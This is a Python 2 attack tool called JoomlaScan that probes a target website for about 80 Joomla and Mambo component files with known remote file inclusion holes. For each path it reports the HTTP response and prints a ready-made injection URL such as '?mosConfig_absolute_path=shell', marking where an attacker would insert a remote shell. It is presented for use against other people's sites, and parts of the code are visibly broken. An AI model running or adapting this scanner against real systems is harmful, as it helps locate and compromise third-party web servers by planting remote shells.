#!usr/bin/python
#Scans known vulnerable RFI path/files in Joomla and reports http response.

#Changelog ver1.1: added proxy support, shells, 404 option 

#Changelog ver1.2: fixed joomla path problem

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, re, httplib, time, socket

def main(path):
	try:
		if proxy != 0:
			h.putrequest("GET", "http://"+host+"/"+path)
		else:
			h.putrequest("HEAD", path)
		h.putheader("Host", host)
		h.endheaders()
		status, reason, headers = h.getreply()
		return status, reason
	except(), msg: 
		print "Error Occurred:",msg
		pass

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

print "\n\t   d3hydr8[at]gmail[dot]com JoomlaScan v1.2"
print "\t--------------------------------------------"

if len(sys.argv) < 2 or len(sys.argv) > 5:
	print "\nUsage: ./joomlascan.py <site> <options>"
	print "\t[options]"
	print "\t   -p/-proxy <host:port> : Add proxy support"
	print "\t   -404 : Won't show 404 responses"
	print "Ex: ./joomlascan.py www.test.com -404 -proxy 127.0.0.1:8080\n"
	sys.exit(1)
	
for arg in sys.argv[1:]:
	if arg.lower() == "-p" or arg.lower() == "-proxy":
		proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-404":
		show = 404
		
try:
	if proxy:
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	proxy = 0
	pass
except(NameError):
	print "\n[-] Proxy Not Given"
	proxy = 0
	pass
except:
	print "\n[-] Proxy Failed"
	proxy = 0
	pass

paths = {"components/com_flyspray/startdown.php" : "startdown.php?file=shell",
		"administrator/components/com_admin/admin.admin.html.php" : "admin.admin.html.php?mosConfig_absolute_path=shell",
		"components/com_simpleboard/file_upload.php" : "file_upload.php?sbp=shell",
		"components/com_hashcash/server.php" : "server.php?mosConfig_absolute_path=shell",
		"components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php" : "config.inc.php?mosConfig_absolute_path=shell",
		"components/com_sitemap/sitemap.xml.php" : "sitemap.xml.php?mosConfig_absolute_path=shell ",
		"components/com_performs/performs.php" : "performs.php?mosConfig_absolute_path=shell",
		"components/com_forum/download.php" : "download.php?phpbb_root_path=shell",
		"components/com_pccookbook/pccookbook.php" : "pccookbook.php?mosConfig_absolute_path=shell",
		"components/com_extcalendar/extcalendar.php" : "extcalendar.php?mosConfig_absolute_path=shell",
		"components/minibb/index.php" : "index.php?absolute_path=shell",
		"components/com_smf/smf.php" : "smf.php?mosConfig_absolute_path=",
		"modules/mod_calendar.php" : "mod_calendar.php?absolute_path=shell ",
		"components/com_pollxt/conf.pollxt.php" : "conf.pollxt.php?mosConfig_absolute_path=shell ",
		"components/com_loudmounth/includes/abbc/abbc.class.php" : "abbc.class.php?mosConfig_absolute_path=shell",
		"components/com_videodb/core/videodb.class.xml.php" : "videodb.class.xml.php?mosConfig_absolute_path=shell",
		"components/com_pcchess/include.pcchess.php" : "include.pcchess.php?mosConfig_absolute_path=shell",
		"administrator/components/com_multibanners/extadminmenus.class.php" : "extadminmenus.class.php?mosConfig_absolute_path=shell",
		"administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php" : "admin.a6mambohelpdesk.php?mosConfig_live_site=shell",
		"administrator/components/com_colophon/admin.colophon.php" : "admin.colophon.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mgm/help.mgm.php" : "help.mgm.php?mosConfig_absolute_path=shell",
		"components/com_mambatstaff/mambatstaff.php" : "mambatstaff.php?mosConfig_absolute_path=shell",
		"components/com_securityimages/configinsert.php" : "configinsert.php?mosConfig_absolute_path=shell",
		"components/com_securityimages/lang.php" : "lang.php?mosConfig_absolute_path=shell",
		"components/com_artlinks/artlinks.dispnew.php" : "artlinks.dispnew.php?mosConfig_absolute_path=shell",
		"components/com_galleria/galleria.html.php" : "galleria.html.php?mosConfig_absolute_path=shell",
		"akocomments.php" : "akocomments.php?mosConfig_absolute_path=shell",
		"administrator/components/com_cropimage/admin.cropcanvas.php" : "admin.cropcanvas.php?cropimagedir=shell",
		"administrator/components/com_kochsuite/config.kochsuite.php" : "config.kochsuite.php?mosConfig_absolute_path=shell",
		"administrator/components/com_comprofiler/plugin.class.php" : "plugin.class.php?mosConfig_absolute_path=shell",
		"components/com_zoom/classes/fs_unix.php" : "fs_unix.php?mosConfig_absolute_path=shell",
		"components/com_zoom/includes/database.php" : "database.php?mosConfig_absolute_path=shell",
		"administrator/components/com_serverstat/install.serverstat.php" : "install.serverstat.php?mosConfig_absolute_path=shell",
		"components/com_fm/fm.install.php" : "fm.install.php?lm_absolute_path=shell",
		"administrator/components/com_mambelfish/mambelfish.class.php" : "mambelfish.class.php?mosConfig_absolute_path=shell",
		"components/com_lmo/lmo.php" : "lmo.php?mosConfig_absolute_path=shell",
		"administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php" : "toolbar.linkdirectory.html.php?mosConfig_absolute_ path=shell",
		"components/com_mtree/Savant2/Savant2_Plugin_textarea.php" : "Savant2_Plugin_textarea.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jim/install.jim.php" : "install.jim.php?mosConfig_absolute_path=shell",
		"administrator/components/com_webring/admin.webring.docs.php" : "admin.webring.docs.php?component_dir=shell",
		"administrator/components/com_remository/admin.remository.php" : "admin.remository.php?mosConfig_absolute_path=shell",
		"administrator/components/com_babackup/classes/Tar.php" : "Tar.php?mosConfig_absolute_path=shell",
		"administrator/components/com_lurm_constructor/admin.lurm_constructor.php" : "admin.lurm_constructor.php?lm_absolute_path=shell",
		"components/com_mambowiki/MamboLogin.php" : "MamboLogin.php?IP=shell",
		"administrator/components/com_a6mambocredits/admin.a6mambocredits.php" : "admin.a6mambocredits.php?mosConfig_live_site=shell",
		"administrator/components/com_phpshop/toolbar.phpshop.html.php" : "toolbar.phpshop.html.php?mosConfig_absolute_path=shell",
		"components/com_cpg/cpg.php" : "cpg.php?mosConfig_absolute_path=shell",
		"components/com_moodle/moodle.php" : "moodle.php?mosConfig_absolute_path=shell ",
		"components/com_extended_registration/registration_detailed.inc.php" : "registration_detailed.inc.php?mosConfig_absolute_path=shell",
		"components/com_mospray/scripts/admin.php" : "admin.php?basedir=shell",
		"administrator/components/com_bayesiannaivefilter/lang.php" : "lang.php?mosConfig_absolute_path=shell",
		"administrator/components/com_uhp/uhp_config.php" : "uhp_config.php?mosConfig_absolute_path=shell",
		"administrator/components/com_peoplebook/param.peoplebook.php" : "param.peoplebook.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mmp/help.mmp.php" : "help.mmp.php?mosConfig_absolute_path=shell",
		"components/com_reporter/processor/reporter.sql.php" : "reporter.sql.php?mosConfig_absolute_path=shell",
		"components/com_madeira/img.php" : "img.php?url=shell",
		"components/com_jd-wiki/lib/tpl/default/main.php" : "main.php?mosConfig_absolute_path=shell",
		"components/com_bsq_sitestats/external/rssfeed.php" : "rssfeed.php?baseDir=shell",
		"com_bsq_sitestats/external/rssfeed.php" : "rssfeed.php?baseDir=shell",
		"components/com_slideshow/admin.slideshow1.php" : "admin.slideshow1.php?mosConfig_live_site=shell",
		"administrator/components/com_panoramic/admin.panoramic.php" : "admin.panoramic.php?mosConfig_live_site=shell",
		"administrator/components/com_mosmedia/includes/credits.html.php" : "credits.html.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mosmedia/includes/info.html.php" : "info.html.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mosmedia/includes/media.divs.php" : "media.divs.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mosmedia/includes/media.divs.js.php" : "media.divs.js.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mosmedia/includes/purchase.html.php" : "purchase.html.php?mosConfig_absolute_path=shell",
		"administrator/components/com_mosmedia/includes/support.html.php" : "support.html.php?mosConfig_absolute_path=shell",
		"administrator/components/com_wmtportfolio/admin.wmtportfolio.php" : "admin.wmtportfolio.php?mosConfig_absolute_path=shell",
		"components/com_mp3_allopass/allopass.php" : "components/com_mp3_allopass/allopass.php?mosConfig_live_site=shell",
		"components/com_mp3_allopass/allopass-error.php" : "components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=shell",
		"administrator/components/com_jcs/jcs.function.php" : "administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jcs/view/add.php" : "administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jcs/view/history.php" : "administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jcs/view/register.php" : "administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jcs/views/list.sub.html.php" : "administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jcs/views/list.user.sub.html.php" : "administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=shell",
		"administrator/components/com_jcs/views/reports.html.php" : "administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=shell",
		"com_joomla_flash_uploader/install.joomla_flash_uploader.php" : "com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=shell",
		"com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php" : "com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=shell"}

host = sys.argv[1]
print "[+] Target:",host
try:
	if show == 404:
		print "[+] 404 Block On\n"
except(NameError):
	print "[-] 404 Block Off\n"
	show = 0
	pass
print "[+] Loaded:",len(paths),"paths"
host = host.replace("http://","")
if host.count("/") >= 2:
	j_path = host.split("/",1)[1].replace("index.php","")
	host = host.split("/",1)[0]
else:
	if host[-1:] == "/":
		host = host[:-1]
	j_path = ""
	
if j_path[-1:] != "/":
	j_path = j_path+"/"
	
print "[+] Started:",timer()
print "[+] Scanning..."
time.sleep(3)

if proxy != 0:
	h = httplib.HTTP(proxy)
else:
	h = httplib.HTTP(host)
	
for path, shell in paths.items():
	print "\n[+] Trying:",j_path+path
	try:
		response, reason = main(j_path+path)
		if show != 404:
			print "[+] Got:",response, reason
			print "[+] Shell:",shell
		else:
			if response != 404:
				print "[+] Got:",response, reason
				print "[+] Shell:",shell
				
	except(AttributeError, TypeError, socket.error):
		pass
	except(KeyboardInterrupt):
		pass
print "\n[-] Done:",timer(),"\n"
 	
